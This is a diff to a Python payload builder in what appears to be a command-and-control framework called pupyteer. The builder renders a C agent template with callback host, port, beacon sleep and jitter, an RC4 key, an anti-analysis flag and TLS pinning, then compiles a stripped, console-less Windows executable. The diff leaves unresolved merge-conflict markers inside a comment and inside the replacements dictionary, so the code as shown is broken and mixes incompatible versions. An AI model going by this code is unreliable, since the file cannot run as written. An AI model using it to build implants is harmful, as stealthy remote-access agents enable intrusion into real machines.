@@ -17,6 +17,7 @@ from __future__ import annotations
 import hashlib
 import logging
 import os
+import re
 import shutil
 import subprocess
 import tempfile
@@ -32,6 +33,7 @@ logger = logging.getLogger("pupyteer.payloads.pe_builder")
 
 # --------------------------------------------------------------------------- #
 #  Template placeholders (defined in pe_template.c)
+<<<<<<< HEAD
 # --------------------------------------------------------------------------- #
 TEMPLATE_PLACEHOLDERS = (
     "{{HOST}}",
@@ -46,6 +48,29 @@ TEMPLATE_PLACEHOLDERS = (
 # 8 hex digits (4 bytes) — deliberately weak by default; operators must set
 # payloads.pe_rc4_key or StubConfig.rc4_key to something real.
 DEFAULT_PE_RC4_KEY = "deadbeef"
+=======
+# --------------------------------------------------------------------------- #:
+# Every one of these has to appear in the template: a placeholder the renderer
+# stops filling is a value the built agent silently never learns, which is how
+# this template ended up shipping without an enrollment secret or a beacon token
+# while the listener had been requiring both.
+TEMPLATE_PLACEHOLDERS = (
+    "{{HOST}}", "{{PORT}}", "{{SLEEP}}", "{{JITTER}}", "{{AUTH}}",
+    "{{TLS}}", "{{TLS_FINGERPRINT}}",
+)
+
+#: Rendered into a C string literal, so anything that could end the literal
+#: early or start an escape has to be refused rather than compiled in.
+_C_UNSAFE = frozenset('"\\') | frozenset(chr(c) for c in range(0x20))
+
+#: A pin is sixty-four hex digits and nothing else. Anything else in the source
+#: means the build was handed something other than a certificate fingerprint,
+#: and the agent would carry a value it can never compare equal to.
+_FINGERPRINT_RE = re.compile(r"^[0-9a-f]{64}$")
+
+#: What a template still asks for after rendering.
+_PLACEHOLDER_RE = re.compile(r"\{\{[A-Z_]+\}\}")
+>>>>>>> origin/nextgen
 
 # Default MinGW compiler
 DEFAULT_MINGW_PATH = "x86_64-w64-mingw32-gcc"
@@ -227,7 +252,14 @@ class PEBuilder:
     def _load_template(self) -> str:
         """Read the C agent template."""
         if self._template_path is None:
+<<<<<<< HEAD
             # Default: relative to this file (pupyteer/payloads/ -> pupyteer/)
+=======
+            # Default: relative to this file. pe_builder.py sits in
+            # pupyteer/payloads/, so two parents, not three — a level too many
+            # and the path points outside the package, which is a build that
+            # cannot find its own template on any install.
+>>>>>>> origin/nextgen
             tpl = (
                 Path(__file__).resolve().parent.parent
                 / "agent"
@@ -242,6 +274,7 @@ class PEBuilder:
         return tpl.read_text(encoding="utf-8")
 
     def _render(self, template: str, cfg: StubConfig) -> str:
+<<<<<<< HEAD
         """Replace placeholders in the template with StubConfig values."""
         # Key precedence: StubConfig.rc4_key > StubConfig.dns_key >
         # config payloads.pe_rc4_key > built-in default. ConfigManager.get()
@@ -257,11 +290,94 @@ class PEBuilder:
             "{{JITTER}}": str(cfg.jitter),
             "{{RC4KEY}}": rc4_key or DEFAULT_PE_RC4_KEY,
             "{{ANTI_ANALYSIS}}": "1" if cfg.anti_analysis else "0",
+=======
+        """Fill the template from the build config, or refuse to build.
+
+        Both ways this fails have to be errors rather than a compiled artifact.
+        A placeholder the template stopped carrying means the agent ships
+        without a value the listener requires, and it fails on the target
+        instead of here — which is precisely how this template came to omit the
+        enrollment secret and the beacon token. A value that cannot sit in a C
+        string literal would either break the compile or, worse, end the literal
+        early and compile something other than what was configured.
+        """
+        missing = [p for p in TEMPLATE_PLACEHOLDERS if p not in template]
+        if missing:
+            raise RuntimeError(
+                f"PE template no longer carries {missing}; it cannot be given "
+                f"{cfg.name or 'this'}'s build settings, and building it anyway "
+                "would produce an agent the listener refuses")
+
+        replacements = {
+            "{{HOST}}": self._c_string("server host", cfg.host or "127.0.0.1"),
+            "{{PORT}}": str(self._c_int("port", cfg.port)),
+            "{{SLEEP}}": str(self._c_int("sleep", cfg.sleep)),
+            "{{JITTER}}": str(self._c_int("jitter", cfg.jitter)),
+            # Empty is legitimate here and only here: it is what the builder
+            # resolves when the server runs with agent_auth off, and the
+            # listener accepts an empty secret exactly when it is disabled.
+            # What is never legitimate is a secret that can end its own C string
+            # literal — that is an operator-controlled file, not a generated one.
+            "{{AUTH}}": self._c_string("enrollment secret", cfg.auth_secret or ""),
+            "{{TLS}}": "1" if cfg.tls else "0",
+            "{{TLS_FINGERPRINT}}": self._pin_for(cfg),
+>>>>>>> origin/nextgen
         }
         src = template
         for placeholder, value in replacements.items():
             src = src.replace(placeholder, value)
+
+        unfilled = sorted(set(_PLACEHOLDER_RE.findall(src)))
+        if unfilled:
+            raise RuntimeError(
+                f"PE template has placeholders nothing fills: {unfilled}")
         return src
+
+    @staticmethod
+    def _pin_for(cfg: StubConfig) -> str:
+        """The SHA-256 the compiled agent will pin, from the certificate it meets.
+
+        Refusing here is the point of the check: an agent built for a TLS
+        listener with nothing to pin either dies on the target — the template
+        rejects an empty pin rather than accept any certificate — or has to be
+        built to accept any certificate, which is a stranger with extra steps.
+        """
+        if not cfg.tls:
+            return ""
+        if not cfg.tls_cert_pem:
+            raise RuntimeError(
+                f"cannot build {cfg.name or 'this'} for a TLS listener: no "
+                "listener certificate was resolved to pin")
+        from pupyteer.server.core.tls import fingerprint_from_pem
+
+        try:
+            pin = fingerprint_from_pem(cfg.tls_cert_pem.encode("ascii"))
+        except Exception as e:
+            raise RuntimeError(
+                f"the listener certificate cannot be pinned: {e}") from None
+        if not _FINGERPRINT_RE.match(pin):
+            raise RuntimeError(f"unexpected certificate fingerprint: {pin!r}")
+        return pin
+
+    @staticmethod
+    def _c_string(field: str, value: str) -> str:
+        """A config value that is safe to compile into a C string literal."""
+        bad = sorted({ch for ch in value if ch in _C_UNSAFE})
+        if bad:
+            raise ValueError(
+                f"{field} cannot be compiled into a payload: it contains "
+                f"{[repr(ch) for ch in bad]}")
+        return value
+
+    @staticmethod
+    def _c_int(field: str, value: Any) -> int:
+        try:
+            number = int(value)
+        except (TypeError, ValueError):
+            raise ValueError(f"{field} must be a number, got {value!r}") from None
+        if not 0 <= number <= 2 ** 31 - 1:
+            raise ValueError(f"{field} out of range for the agent: {number}")
+        return number
 
     def _compile(
         self,
@@ -274,7 +390,13 @@ class PEBuilder:
             compiler,
             "-o", str(out_path),
             str(src_path),
+            # The template's TLS path is Schannel, whose declarations only exist
+            # when the header is told to describe the user-mode SSPI; without it
+            # MinGW's own sspi.h refuses to compile at all.
+            "-DSECURITY_WIN32",
             "-lws2_32",
+            "-lsecur32",      # InitSecurityInterface / the SSPI calls
+            "-lcrypt32",      # hashing the pinned certificate
             "-O2",            # optimize for size
             "-mwindows",      # GUI subsystem (no console)
             "-s",             # strip symbols
